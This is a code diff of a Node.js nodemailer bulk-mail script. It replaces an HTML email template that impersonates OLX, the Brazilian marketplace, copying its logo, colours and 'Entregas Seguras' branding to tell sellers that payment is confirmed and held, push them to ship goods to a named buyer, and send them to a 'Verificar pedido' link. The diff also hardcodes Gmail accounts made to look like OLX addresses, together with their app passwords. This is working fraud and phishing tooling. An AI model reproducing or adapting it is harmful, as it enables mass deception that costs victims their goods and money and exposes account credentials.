@@ -6,8 +6,8 @@ const path = require("path");
 const transporter = nodemailer.createTransport({
   service: "gmail", // troque para seu serviço: 'gmail', 'hotmail', etc
   auth: {
-    user: "olx.suportedevendas.ltdaonline@gmail.com", // seu email
-    pass: "gcjt mlpl xozn ujmt", // sua senha ou senha de app
+    user: "newsoixpay.com.br.grupoolx.com.br@gmail.com", // seu email
+    pass: "gphz ropb cvyu gcqz", // sua senha ou senha de app
   },
 });
 
@@ -106,47 +106,74 @@ async function enviarEmMassa(
   // Enviar para cada e-mail da lista
   for (const email of listaEmails) {
     // Template do e-mail com link personalizado
-    const mensagemHTML = `<div
-    style="font-family: Arial, sans-serif; max-width: 600px; margin: auto; padding: 20px; border: 1px solid #ddd; border-radius: 10px; background-color: #f9f9f9;">
-    <h2 style="color: #333;">📨 Confirmação de Pagamento Recebido</h2>
+    const mensagemHTML = `<div style="max-width:600px; margin:auto; background:#ffffff; padding:20px; font-family:Arial, sans-serif;">
 
-    <p>Olá,</p>
+  <div style="text-align:center; margin-bottom:20px;">
+    <img src="https://play-lh.googleusercontent.com/FHJT9Msv-P2k0eqJhf61JBLdV_FLw1Apiar9A3FjaF4rB9hysQTxkLky1odU818n0sI=w240-h480-rw" alt="OLX Logo" style="height:50px;">
+  </div>
 
-    <p>Informamos que o pagamento referente ao seu produto foi <strong>recebido com sucesso</strong> em nossa
-        plataforma.</p>
+  <p style="text-align:center; color:#7027f9; font-size:12px; margin:0;">
+    Carros • Imóveis • Eletrônicos • Móveis
+    <span style="background-color:#f78002; color:#fff; padding:2px 8px; border-radius:10px; margin-left:8px; font-size:11px;">Baixar o App</span>
+  </p>
 
-    <p>Agora, você já pode providenciar o envio com segurança para o Comprador: <strong>${nomeComprador}</strong></p>
+  <h2 style="text-align:center; color:#7027f9; margin-top:20px;">
+    📨 Pagamento Confirmado
+  </h2>
 
-    <p><strong>Forma de envio:</strong> Entrega</p>
+  <p style="text-align:center; color:#3c3c3c; font-size:15px;">
+    Recebemos seu pagamento com <strong>sucesso</strong>! Agora você deve <strong>providenciar o envio do produto</strong> para <strong>${nomeComprador}</strong>.
+  </p>
 
-    <p><strong>O comprador deve informar:</strong></p>
-    <ul>
-        <li>Placa do veículo</li>
-        <li>Modelo do veículo</li>
-        <li>Nome do motorista responsável pela entrega</li>
-    </ul>
+  <div style="text-align:center; margin:25px 0;">
+    <a href="${linkProduto}" target="_blank"
+       style="background-color:#f78002; color:white; text-decoration:none; padding:12px 24px; border-radius:30px; display:inline-block; font-weight:bold;">
+      Verificar pedido
+    </a>
+  </div>
 
-    <hr style="border: none; border-top: 1px solid #ccc;" />
+  <hr style="border:none; border-top:1px solid #e5e5e5; margin:20px 0;">
 
-    <p><strong>Observação importante:</strong><br>
-        Para garantir a segurança de todos, observamos que esta é uma das suas primeiras transações. Por esse motivo, o
-        valor ficará temporariamente retido em nossa conta até a confirmação da entrega.</p>
+  <h3 style="color:#7027f9;">O que você precisa informar</h3>
 
-    <p>Assim que o produto for entregue e confirmado no sistema, o valor será liberado automaticamente para sua conta.
+  <div style="background:#f9f9f9; border-radius:6px; padding:15px; margin:20px 0;">
+    <p style="margin:0; color:#3c3c3c; font-size:15px;">
+      Para garantir que o transporte seja concluído com segurança, você deve informar os dados do envio:
     </p>
+    <ul style="padding-left:18px; color:#3c3c3c; font-size:15px; line-height:1.6; margin-top:10px;">
+      <li>Placa do veículo que fará a entrega</li>
+      <li>Modelo do veículo</li>
+      <li>Nome do motorista responsável</li>
+      <li>Ou código de rastreio, se for via transportadora</li>
+    </ul>
+  </div>
 
-    <div style="text-align: center; margin: 30px 0;">
-        <a href="${linkProduto}"
-            style="background-color: #4CAF50; color: white; padding: 12px 20px; text-decoration: none; border-radius: 5px; display: inline-block;">Visualizar
-            Produto e Envio</a>
-    </div>
+  <h3 style="color:#7027f9;">Vantagens de enviar com a OLX</h3>
 
-    <p>Essa medida garante uma experiência segura e protegida para ambas as partes.</p>
+  <ul style="padding-left:18px; color:#3c3c3c; font-size:15px; line-height:1.6;">
+    <li><strong style="color:#f78002;">Pagamento garantido</strong>: o valor já está reservado.</li>
+    <li>O valor será <strong style="color:#f78002;">liberado automaticamente</strong> após a confirmação da entrega.</li>
+    <li>Suporte OLX disponível durante todo o processo.</li>
+  </ul>
 
-    <p>Em caso de dúvidas, entre em contato com nossa equipe de suporte.</p>
+  <hr style="border:none; border-top:1px solid #e5e5e5; margin:20px 0;">
 
-    <p style="color: #555; font-size: 14px;">Atenciosamente,<br><strong>Equipe de Suporte</strong><br>OLX Entregas
-        Seguras</p>
+  <p style="color:#3c3c3c; font-size:15px; line-height:1.6;">
+    Se tiver qualquer dúvida, acesse nossa 
+    <a href="https://ajuda.olx.com.br" target="_blank" style="color:#7027f9; text-decoration:none;"><strong>Central de Ajuda</strong></a> 
+    ou entre em contato com nosso suporte.
+  </p>
+
+  <div style="text-align:center; margin-top:30px;">
+    <a href="#" style="color:#7027f9; text-decoration:none; margin:0 10px;">Verificar e-mail</a> |
+    <a href="#" style="color:#7027f9; text-decoration:none; margin:0 10px;">Verificar telefone</a> |
+    <a href="#" style="color:#7027f9; text-decoration:none; margin:0 10px;">Conectar Facebook</a>
+  </div>
+
+  <p style="text-align:center; color:#777; font-size:12px; margin-top:20px;">
+    OLX Entregas Seguras • Todos os direitos reservados
+  </p>
+
 </div>`;
 
     // Enviar e-mail
